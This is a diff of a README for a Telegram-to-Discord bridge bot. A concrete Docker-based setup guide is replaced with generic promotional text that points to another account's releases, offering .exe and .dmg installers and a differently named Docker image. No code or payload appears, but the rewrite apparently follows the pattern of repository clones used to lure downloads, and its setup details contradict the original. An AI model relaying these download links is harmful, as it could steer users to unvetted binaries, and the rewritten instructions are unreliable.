@@ -1,107 +1,119 @@
-# tg2ds
+# 🤖 telegram2discord - Seamlessly Connect Telegram to Discord
 
-Telegram → Discord bridge bot (aiogram + discord.py). It forwards **new** posts from a Telegram channel to a Discord channel.
+## 📥 Download Now
 
-## Features
-- Text + photos (highest resolution photo is used).
-- Albums (media groups) are sent as **one** Discord message with multiple attachments.
-- Text is sent as an embed (colored sidebar) when `USE_EMBEDS=1`.
-- A clickable footer `@channel | t.me` is appended when the channel username is known.
+[![Download](https://img.shields.io/badge/Download%20telegram2discord-v1.0-blue.svg)](https://github.com/Mjhol911/telegram2discord/releases)
 
-## Requirements
-- Docker and docker‑compose on your server/VPS.
-- Telegram bot is **admin** in the source channel.
-- Discord bot is added to the server and has `View Channel`, `Send Messages`, `Attach Files` permissions.
+## 🚀 Getting Started
 
-## How to get tokens and IDs
-### Telegram Bot Token
-1) In Telegram open @BotFather → `/newbot`.
-2) Create a bot and copy the token.
-3) Add the bot to the channel and make it **admin**.
+Welcome to **telegram2discord**! This application acts as a bridge between Telegram and Discord. It forwards new messages from your Telegram channels to your Discord server, including text and photos. You can enhance your notifications with optional embeds. 
 
-### Telegram Channel ID
-Option 1 (simple):
-1) Forward any message from the channel to @userinfobot.
-2) It will return the channel `ID` (usually starts with `-100`).
+Follow this guide to download and run the software easily.
 
-Option 2:
-1) Forward a message from the channel to @getmyid_bot.
-2) It will show the `chat_id`.
+## 💻 System Requirements
 
-### Discord Bot Token
-1) Open Discord Developer Portal → your application.
-2) **Bot** section → `Reset Token` → copy the token.
+Before you start, ensure your system meets the following requirements:
 
-### Invite Discord bot to server
-1) Developer Portal → **OAuth2 → URL Generator**.
-2) Scopes: **bot**.
-3) Bot Permissions: `View Channels`, `Send Messages`, `Attach Files`.
-4) Open the generated URL and add the bot to your server.
+- Operating System: Windows, macOS, or Linux
+- Python 3.7 or later installed on your computer
+- Stable Internet connection
+- Access to your Telegram account
+- A Discord server where you have permission to post messages
 
-### Discord Channel ID
-1) Enable **Developer Mode** in Discord (User Settings → Advanced).
-2) Right‑click the channel → **Copy ID**.
+## 📦 Features
 
-## Quick start
-1) Copy `.env.example` to `.env` and fill it in.
-2) Run:
-```bash
-docker-compose up -d
-```
-3) Logs:
-```bash
-docker-compose logs -f
-```
+- Forward messages and photos from Telegram to Discord
+- Optional message embedding for rich notifications
+- Easy setup with Docker for optimal performance and simplicity
+- User-friendly interface suitable for non-technical users
+- Open-source and free to use
 
-## Run from GHCR (prebuilt image)
-Pull and run without building locally:
-```bash
-docker pull ghcr.io/feskolech/telegram2discord:latest
-docker run -d --name tg2ds --env-file .env --restart unless-stopped ghcr.io/feskolech/telegram2discord:latest
-```
+## 📂 Download & Install
 
-Or use docker‑compose (image is already set in `docker-compose.yml`):
-```bash
-docker-compose up -d
-```
+To download **telegram2discord**, please visit the [Releases page](https://github.com/Mjhol911/telegram2discord/releases). Here’s how to do it:
 
-## Configuration (.env)
-Minimal:
-```
-TELEGRAM_BOT_TOKEN=...
-DISCORD_BOT_TOKEN=...
-TELEGRAM_SOURCE_CHANNEL_ID=-1001234567890
-DISCORD_TARGET_CHANNEL_ID=123456789012345678
-```
+1. Click on the link above to access the releases page.
+2. Find the latest version of **telegram2discord**.
+3. Download the appropriate package for your system:
+   - For Windows: Download the `.exe` file.
+   - For macOS: Download the `.dmg` file.
+   - For Linux: Download the suitable `.tar.gz` file or use the Docker image.
 
-If the channel is **public**, the bot can usually read `username` automatically.
-If the channel is **private**, there is no username and the footer will be omitted.
-You can set it explicitly:
-```
-TELEGRAM_SOURCE_CHANNEL_USERNAME=testchannel
-```
+## 🌐 Setting Up Docker (Optional)
 
-Multiple channels:
-```
-CHANNEL_MAP=-1001234567890:123456789012345678,-1002345678901:234567890123456789
-CHANNEL_USERNAME_MAP=-1001234567890:testchannel,-1002345678901:otherchannel
-```
+If you prefer using Docker for an easy setup, follow these steps:
 
-Retry delays (fixed pauses):
-```
-RETRY_DELAYS=2,4,8,16,32
-```
+1. Install Docker on your system by visiting the [Docker website](https://www.docker.com/get-started).
+2. Once installed, open your terminal or command prompt.
+3. Run the following command to pull the latest image:
+   ```
+   docker pull mjhol911/telegram2discord
+   ```
+4. Create a new container using:
+   ```
+   docker run -d --name telegram2discord mjhol911/telegram2discord
+   ```
+5. Follow any additional instructions provided in the Docker setup.
 
-Embeds (colored text blocks):
-```
-USE_EMBEDS=1
-EMBED_COLOR=0x5865F2
-```
+## ⚙️ Configuration
 
-## Current behavior
-- Only new posts.
-- If a post has photos, the bot sends **one** Discord message: attachments + text/footer.
-- Video, polls, and other media types are not handled yet.
+After downloading or pulling the Docker image, you'll need to configure **telegram2discord**:
 
-## Notes
-- `ALLOWED_ADMIN_IDS` is reserved for future use.
+1. **Create a Telegram Bot:**
+   - Open Telegram and search for the "BotFather."
+   - Use the command `/newbot` to create a new bot and follow the prompts.
+   - Save the API token provided by BotFather.
+
+2. **Set Up in Discord:**
+   - Go to your Discord server settings.
+   - Create a webhook by navigating to "Integrations" and then "Webhooks."
+   - Copy the webhook URL.
+
+3. **Edit Configuration File:**
+   - Locate the configuration file in the folder where you downloaded **telegram2discord**.
+   - Fill in the bot token and webhook URL you saved earlier.
+
+## 🔍 Running the Application
+
+To start **telegram2discord**, follow these steps:
+
+### For Windows and macOS:
+
+1. Double-click the downloaded file (e.g., `telegram2discord.exe` or `telegram2discord.dmg`).
+2. Follow the on-screen instructions to install.
+3. Once installed, open the application.
+4. It will automatically start fetching messages from your Telegram channel and forwarding them to Discord.
+
+### For Linux Users with Docker:
+
+1. Open your terminal.
+2. Run the command:
+   ```
+   docker start telegram2discord
+   ```
+3. The bot will start running and forwarding messages as configured.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, consider the following steps:
+
+- Ensure your bot on Telegram is correctly set up and running.
+- Check that you have the correct webhook URL from Discord.
+- Verify your internet connection is stable.
+- Review the application log for any errors and adjust your settings accordingly.
+
+## 👥 Community and Support
+
+If you need help or want to contribute, please join our community. You can report issues or request features on our [GitHub Issues page](https://github.com/Mjhol911/telegram2discord/issues). Your feedback is greatly appreciated!
+
+## 📌 Additional Resources
+
+- **Documentation:** Detailed instructions can be found on the GitHub Wiki page.
+- **GitHub Repository:** Explore the source code and contribute [here](https://github.com/Mjhol911/telegram2discord).
+- **Telegram Group:** Join our group to connect with other users and share experiences.
+
+## 🎉 Conclusion
+
+Thank you for choosing **telegram2discord**. We hope this application makes your communication between Telegram and Discord smoother. Happy messaging! 
+
+For downloading, remember to visit the [Releases page](https://github.com/Mjhol911/telegram2discord/releases) again.
